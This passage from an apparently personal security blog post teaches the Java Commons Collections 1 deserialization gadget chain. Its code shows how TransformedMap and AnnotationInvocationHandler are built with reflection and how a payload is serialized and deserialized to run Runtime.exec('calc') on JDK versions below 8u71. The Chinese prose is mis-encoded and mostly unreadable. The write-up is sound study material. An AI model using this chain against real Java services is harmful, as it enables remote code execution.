<p>pocä¸­Transformer transformerChain &#x3D; new ChainedTransformer(transformers);å®ç°äº†æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆåªè¦è°è°ƒç”¨äº†è¿™ä¸ªç±»çš„transformï¼Œé‚£ä¹ˆå°±ä¼šå®ç°Runtime.getRuntime().exec(â€˜calcâ€™);æ¥ä¸‹æ¥æˆ‘ä»¬çš„ç›®æ ‡ä¹Ÿæ¸…æ™°äº†ï¼Œå°±æ˜¯å¯»æ‰¾è°ƒç”¨transformçš„ç±»</p>
<p><strong>â‘£TransformedMapç±»</strong></p>
<p>TransformedMapæ˜¯ä¸€ä¸ªä¿®é¥°å™¨</p>
<p>çœ‹åˆ°pocä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Map&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();<br>innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);<br>Map transformedMap = TransformedMap.decorate(innerMap, null, transformerChain);<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆå®ä¾‹åŒ–HashMapç±»ï¼Œå…¶æ¬¡è°ƒç”¨putæ–¹æ³•ï¼Œä¼ å…¥value(ä¸ºä»€ä¹ˆä¼ å…¥valueåé¢è§£é‡Š)ï¼Œæœ€åè°ƒç”¨è£…é¥°å™¨ï¼Œè¯¥æ¨¡å¼çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>åœ¨ä¸æ”¹å˜åŸå¯¹è±¡ï¼ˆInner Mapï¼‰ç»“æ„çš„æƒ…å†µä¸‹ï¼ŒåŠ¨æ€åœ°ç»™å®ƒâ€œæŠ«ä¸Šä¸€å±‚å¤–è¡£â€ï¼Œä»è€Œå¢å¼ºå®ƒçš„åŠŸèƒ½ã€‚</strong></p>
<p>æƒ³ç†è§£Map transformedMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);å°±å¾—çœ‹çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>    return new TransformedMap(map, keyTransformer, valueTransformer);<br>&#125;<br>// ç»§æ‰¿è‡ª AbstractInputCheckedMapDecorator<br>public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable &#123;<br><br>    protected final Transformer keyTransformer;<br>    protected final Transformer valueTransformer;<br>    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        super(map);<br>        this.keyTransformer = keyTransformer;<br>        this.valueTransformer = valueTransformer;<br>    &#125;<br>    // ...<br>&#125;<br>protected Object checkSetValue(Object value) &#123;<br>        return this.valueTransformer.transform(value);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæœ€å this.valueTransformer &#x3D; transformerChain</p>
<p><strong>â‘¤AnnotationInvocationHandler</strong></p>
<p>å‰é¢è¯´åˆ°è¿‡ååºåˆ—åŒ–å…¥å£éœ€è¦æœ‰readObject,è¿™ä¸ªç±»å®Œç¾çš„é‡å†™äº†readObjectæ–¹æ³•ï¼ŒåŒæ—¶è¿™ä¸ªreadObjectæ–¹æ³•è¿˜å¯ä»¥ä¸²è”èµ·æˆ‘ä»¬çš„æ„é€ é“¾ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private void readObject(java.io.ObjectInputStream s) &#123;<br>    s.defaultReadObject();<br>    // ... çœç•¥éƒ¨åˆ†ä»£ç <br>    <br>    // å…³é”®ç‚¹ï¼šéå† Map<br>    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        String name = memberValue.getKey();   //æ‹¿åˆ°value<br>        Class&lt;?&gt; memberType = memberTypes.get(name); //è¿”å›æšä¸¾ç±»å‹<br>        <br>        if (memberType != null) &#123;<br>            Object value = memberValue.getValue();  //è¿™é‡Œæ‹¿åˆ°çš„æ˜¯string<br>            if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123;<br>                // ğŸ’¥ æ¼æ´è§¦å‘ç‚¹ï¼šè¿™é‡Œè°ƒç”¨äº† setValue<br>                // å¦‚æœè¿™ä¸ª Map æ˜¯ TransformedMapï¼ŒsetValue ä¼šè§¦å‘ checkSetValue<br>                // è¿›è€Œæ‰§è¡Œ transform()ï¼Œå¯¼è‡´ RCE<br>                memberValue.setValue(<br>                    new AnnotationTypeMismatchExceptionProxy(<br>                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(<br>                            annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆåˆ©ç”¨åå°„å¼ºè¡Œå®ä¾‹åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);//æ‹¿åˆ°æ„é€ å‡½æ•°<br>        constructor.setAccessible(true);<br> Object payload = constructor.newInstance(Retention.class, transformedMap);        <br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„Retention.class å®ƒå‘Šè¯‰ Handlerï¼šâ€œä½ æ˜¯ç”¨æ¥å¤„ç† <code>@Retention</code> è¿™ä¸ªæ³¨è§£çš„ã€‚â€ è¿™ä¹Ÿå†³å®šäº†åç»­ Handler ä¼šå»æ£€æŸ¥ Map é‡Œæœ‰æ²¡æœ‰ key å« <code>&quot;value&quot; </code>ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ç»™mapä¼ å…¥valueçš„åŸå› </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>// æ„é€ å‡½æ•°<br>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>    // ... çœç•¥ç±»å‹æ£€æŸ¥ ...<br>    <br>    // ã€çœŸç›¸å°±åœ¨è¿™é‡Œï¼ã€‘<br>    // ä½ ä¼ è¿›æ¥çš„ç¬¬äºŒä¸ªå‚æ•° (transformedMap)ï¼Œè¢«ç›´æ¥èµ‹å€¼ç»™äº†è¿™ä¸ªç±»çš„æˆå‘˜å˜é‡ memberValues<br>    this.memberValues = memberValues;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä»¥ä¸Šæ˜¯æ„é€ æ–¹æ³•ï¼ŒObject payload &#x3D; constructor.newInstance(Retention.class, transformedMap);  å°±æ˜¯è¿™æ­¥ä¼ å…¥Retention.class, transformedMapï¼Œå³ this.memberValues&#x3D;transformedMap ã€‚é‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘readObjectï¼ŒAnnotationInvocationHandlerä¼šéå†memberValueï¼ˆä¹Ÿå°±æ˜¯ä¹‹å‰çš„transformedMapï¼‰ï¼Œå®ƒæ‹¿åˆ°äº†æˆ‘ä»¬æ„é€ çš„é‚£ä¸ª Entryï¼škey&#x3D;â€valueâ€, value&#x3D;â€uselessStringâ€ã€‚</p>
<p><strong>æŸ¥é˜…è§„åˆ™ï¼š</strong> å®ƒå»æŸ¥çœ‹ Retention.class çš„å®šä¹‰ï¼Œå‘ç°ç¡®å®æœ‰ä¸€ä¸ªå« value() çš„æ–¹æ³•ï¼Œä¸”å…¶è¿”å›ç±»å‹åº”è¯¥æ˜¯ <strong>RetentionPolicy</strong>ï¼ˆæšä¸¾ï¼‰ã€‚</p>
<p><strong>å¯¹æ¯”ç°çŠ¶ï¼š</strong> å®ƒçœ‹äº†ä¸€çœ¼ Map é‡Œçš„ valueï¼Œå‘ç°æ˜¯ä¸€ä¸ª Stringç±»å‹</p>
<p>äºæ˜¯è°ƒç”¨memberValue.setValueï¼ˆï¼‰è¿›è¡Œä¿®æ­£ï¼Œä¼šè§¦å‘TransformedMapä¿®é¥°å™¨çš„checkSetValueï¼Œå› ä¸º <code>TransformedMap</code> åœ¨è£…é¥° <code>HashMap</code> æ—¶ï¼Œä¸ä»…è£…é¥°äº† Map æœ¬èº«ï¼Œè¿˜è£…é¥°äº†å®ƒçš„ <code>entrySet()</code>ã€‚å½“æˆ‘ä»¬éå† <code>Map.Entry</code> å¹¶è°ƒç”¨ <code>setValue</code> æ—¶ï¼Œå®é™…è°ƒç”¨çš„æ˜¯è¢«ä¿®é¥°è¿‡çš„ <code>MapEntry.setValue</code>ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨ä¼šå›è°ƒ <code>TransformedMap</code> çš„ <code>checkSetValue</code>.å¯ä»¥ç±»æ¯”TransformedMapè¿™ä¸ªä¿®é¥°å™¨åŒ…è£¹ç€mapï¼Œä»»ä½•ä¿®æ”¹ä¼šç»è¿‡è¿™ä¸ªä¿®é¥°å™¨ã€‚è¿™ä¸ªä¿®é¥°å™¨ä¼šè¿”å›return this.valueTransformer.transform(value)ã€‚ç»ˆäºï¼Œå¿ƒå¿ƒå¿µå¿µçš„transformæ¥äº†ï¼Œååºåˆ—åŒ–é“¾æˆç«‹ï¼ï¼</p>
<p><strong>åºåˆ—åŒ–</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ByteArrayOutputStream barr = new ByteArrayOutputStream();<br>ObjectOutputStream oos = new ObjectOutputStream(barr);<br>oos.writeObject(payload);<br>oos.close();<br><br>System.out.println(&quot;Payload ç”ŸæˆæˆåŠŸ!&quot;);<br></code></pre></td></tr></table></figure>

<p><strong>ååºåˆ—åŒ–</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ByteArrayInputStream bis = new ByteArrayInputStream(barr.toByteArray());<br>        ObjectInputStream ois = new ObjectInputStream(bis);<br>        ois.readObject(); // æ­¤æ—¶è®¡ç®—å™¨å¼¹å‡º<br>        ois.close();<br></code></pre></td></tr></table></figure>

<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™åªæ˜¯åŸºäºJDK ç‰ˆæœ¬ <strong>ä½äº 8u71</strong>ï¼Œé«˜ç‰ˆæœ¬çš„ååºåˆ—åŒ–é“¾è¿˜åœ¨å­¦ä¹ ä¸­â€¦â€¦</p>

  </div>
</article>



      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/home/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E6%98%AF%E5%8F%8D%E5%B0%84"><span class="toc-number">1.</span> <span class="toc-text">ä¸€æ˜¯åå°„</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">äºŒååºåˆ—åŒ–</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CommonsCollections1%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">CommonsCollections1é“¾</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">æ€»ç»“</span></a>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2025/12/17/blog3/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2025/12/17/blog3/&text=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2025/12/17/blog3/&is_video=false&description=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JAVAååºåˆ—åŒ–åˆæ¢&body=Check out this article: https://q1ng-li.github.io/2025/12/17/blog3/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2025/12/17/blog3/&name=JAVAååºåˆ—åŒ–åˆæ¢&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2025 q1ng
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/home/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

      
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

<!-- Disqus Comments -->


    </div>
</body>
</html>
